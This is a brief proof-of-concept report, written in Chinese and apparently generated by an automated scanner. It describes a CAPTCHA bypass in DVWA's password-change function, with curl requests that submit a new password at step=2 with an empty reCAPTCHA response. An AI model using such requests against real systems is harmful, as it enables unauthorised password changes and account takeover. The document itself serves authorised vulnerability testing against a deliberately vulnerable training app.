# POC — DVWA 密码修改功能 step=2 阶段完全跳过 CAPTCHA 校验，可绕过验证码直接改密

- finding_id: `LLM-ecdc7684a376`
- type: `captcha_bypass` / CWE-804
- severity: `high`
- file: `014.php:61`

## 步骤

1. **确认目标可达且已获授权**  
```http
curl -sS -i 'http://TARGET:8080/014.php'
```
预期：返回应用页面/接口响应，而不是连接失败

2. **发送 验证码绕过 载荷**  
```http
curl -sS -i -X POST 'http://TARGET:8080/014.php' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'Change=Change&step=2&password_new=SUNSET_NEW&password_conf=SUNSET_NEW&g-recaptcha-response='
```
预期：状态改变请求被接受或进入下一步流程

3. **读取账户状态/重新登录确认状态确实改变**  
预期：密码或业务状态已改变；请求无需 CSRF token/有效验证码

## 安全说明

POC 仅为文本工件；落日二号不会执行它，也不会联网或搭建沙箱。仅限授权测试。